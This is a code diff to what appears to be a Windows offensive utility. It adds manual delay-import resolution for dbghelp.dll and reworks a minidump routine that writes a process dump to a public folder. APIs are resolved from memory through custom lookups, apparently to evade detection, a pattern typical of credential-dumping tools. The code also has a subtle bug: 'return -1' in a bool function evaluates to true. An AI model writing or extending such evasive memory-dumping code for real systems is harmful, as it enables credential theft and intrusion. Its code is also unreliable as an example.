@@ -13,7 +13,7 @@
 #define SW_SHOWNORMAL 0x1
 
 // general
-typedef HMODULE(WINAPI* LoadLibraryAPtr)(
+typedef HMODULE (WINAPI* LoadLibraryAPtr)(
     LPCSTR lpLibFileName
     );
 
@@ -35,6 +35,12 @@ typedef LPVOID(*VirtualAllocPtr)(
     DWORD  flAllocationType,
     DWORD  flProtect
     );
+typedef LPVOID(*VirtualProtectPtr)(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flNewProtect,
+    PDWORD  lpflOldProtect
+    );
 typedef NTSTATUS(*NtQueryInformationProcessPtr)(
     HANDLE           ProcessHandle,
     PROCESSINFOCLASS ProcessInformationClass,
@@ -51,7 +57,7 @@ typedef NTSTATUS(*NtReadVirtualMemoryPtr)(
     );
 
 // minidump
-typedef HANDLE(*CreateFileAPtr)(
+typedef HANDLE (WINAPI* CreateFileAPtr)(
     LPCSTR                lpFileName,
     DWORD                 dwDesiredAccess,
     DWORD                 dwShareMode,
@@ -60,7 +66,7 @@ typedef HANDLE(*CreateFileAPtr)(
     DWORD                 dwFlagsAndAttributes,
     HANDLE                hTemplateFile
     );
-typedef BOOL(WINAPI *MiniDumpWriteDumpPtr)(
+typedef BOOL(WINAPI* MiniDumpWriteDumpPtr)(
     HANDLE        hProcess,
     DWORD         ProcessId,
     HANDLE        hFile,
@@ -160,6 +166,100 @@ namespace utils {
         return h;
     }
 
+    bool ResolveDelayImports(HMODULE hModule, HMODULE hDep) {
+        if (!hModule) return false;
+        BYTE* base = (BYTE*)hModule;
+
+        auto kernel32 = GetDllFromMemory(L"kernel32.dll");
+        if (!kernel32) return false;
+
+        LoadLibraryAPtr LoadLibraryA = (LoadLibraryAPtr)GetProcAddr(kernel32, "LoadLibraryA");
+        if (!LoadLibraryA) return false;
+
+        VirtualProtectPtr VirtualProtect = (VirtualProtectPtr)GetProcAddr(kernel32, "VirtualProtect");
+        if (!VirtualProtect) return -1;
+
+        // Parse headers
+        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+
+        IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
+        if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
+
+        IMAGE_DATA_DIRECTORY delayDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
+        if (delayDir.VirtualAddress == 0 || delayDir.Size == 0) {
+            // No delay imports
+            return true;
+        }
+
+        PMY_IMAGE_DELAYLOAD_DESCRIPTOR desc = (PMY_IMAGE_DELAYLOAD_DESCRIPTOR)(base + delayDir.VirtualAddress);
+
+        // Walk descriptors until an all-zero descriptor (DLLNameRVA == 0)
+        for (; desc->DllNameRVA != 0; ++desc) {
+            const char* dllName = (const char*)(base + desc->DllNameRVA);
+            if (!dllName) continue;
+            //message(dllName, "loading delayed");
+
+            // Compute the IAT and INT addresses
+            DWORD iatRva = desc->ImportAddressTableRVA;
+            DWORD intRva = desc->ImportNameTableRVA;
+            if (iatRva == 0 || intRva == 0) {
+                // nothing to fix
+                //message(dllName, "nothing to fix");
+                continue;
+            }
+
+            ULONG_PTR* pIAT = (ULONG_PTR*)(base + iatRva);
+            IMAGE_THUNK_DATA64* pINT = (IMAGE_THUNK_DATA64*)(base + intRva);
+
+            // Iterate through entries until a zero pointer in IAT
+            for (size_t idx = 0;; ++idx) {
+                //message(dllName, "fixing...");
+
+                // read IAT entry
+                ULONG_PTR* iatEntryAddr = &pIAT[idx];
+                ULONG_PTR iatVal = *iatEntryAddr;
+                IMAGE_THUNK_DATA64 iData = pINT[idx];
+
+                // Termination: when both INT and IAT entry are zero
+                if (iData.u1.AddressOfData == 0 && iatVal == 0) break;
+
+                // Determine if import by ordinal or by name
+                bool byOrdinal = (iData.u1.Ordinal & IMAGE_ORDINAL_FLAG64) != 0;
+                FARPROC target = NULL;
+                if (byOrdinal) {
+                    WORD ordinal = (WORD)(iData.u1.Ordinal & 0xFFFF);
+                    target = (FARPROC)GetProcAddr(hDep, (LPCSTR)(uintptr_t)ordinal);
+                    //message_hex(target, "fixing ord # ...");
+                }
+                else {
+                    IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)(base + (DWORD)iData.u1.AddressOfData);
+                    const char* funcName = (const char*)ibn->Name;
+                    target = GetProcAddr(hDep, funcName);
+                    //message(funcName, "fixing ...");
+                }
+
+                if (!target) {
+                    message_hex(iatEntryAddr, "target func not found");
+                    return false;
+                }
+
+                // If the IAT already points correctly, skip
+                if ((ULONG_PTR)iatVal == (ULONG_PTR)target) {
+                    continue;
+                }
+
+                // Write the resolved pointer into the IAT slot
+                DWORD old;
+                VirtualProtect(iatEntryAddr, sizeof(ULONG_PTR), PAGE_READWRITE, &old);
+                *iatEntryAddr = (ULONG_PTR)target;
+                VirtualProtect(iatEntryAddr, sizeof(ULONG_PTR), old, &old);
+            }
+        }
+
+        return true;
+    }
+
     bool proc_mini_dump(HANDLE hProc, DWORD pid) {
         char outFile[] = "C:\\Users\\Public\\Downloads\\out.dmp";
 
@@ -169,22 +269,34 @@ namespace utils {
         LoadLibraryAPtr LoadLibraryA = (LoadLibraryAPtr)GetProcAddr(kernel32, "LoadLibraryA");
         if (!LoadLibraryA) return false;
 
-        HMODULE hModule = LoadLibraryA("dbghelp.dll");
-        if (hModule == NULL) return false;
+        HMODULE hDep = LoadLibraryA("rpcrt4.dll"); // ensure rpcrt4 is available
+        if (!hDep) {
+            message("cannot load dependet rpcrt4.dll", "mini error");
+            return false;
+        }
 
-        HMODULE h1 = LoadLibraryA("dbgcore.dll"); // dbghelp depends on this
-        if (!h1) return false;
+        HMODULE hDbghelp = LoadLibraryA("dbghelp.dll");
+        if (!hDbghelp) {
+            message("cannot load dbghelp.dll", "mini error");
+            return false;
+        }
 
-        HMODULE h2 = LoadLibraryA("rpcrt4.dll"); // dbghelp depends on this
-        if (!h2) return false;
+        LoadLibraryA("dbgcore.dll");
+
+        if (!ResolveDelayImports(hDbghelp, hDep)) {
+            message("failed to load delayed dlls", "mini error");
+            return false;
+        }
+
+        message("resolved delayload dlls", "dbghelp.dll");
 
         CreateFileAPtr CreateFileA = (CreateFileAPtr)GetProcAddr(kernel32, "CreateFileA");
         if (!CreateFileA) return false;
 
-        MiniDumpWriteDumpPtr MiniDumpWriteDump = (MiniDumpWriteDumpPtr)GetProcAddr(hModule, "MiniDumpWriteDump");
+        MiniDumpWriteDumpPtr MiniDumpWriteDump = (MiniDumpWriteDumpPtr)GetProcAddr(hDbghelp, "MiniDumpWriteDump");
         if (!MiniDumpWriteDump) return false;
 
-        HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
             return false;
         }
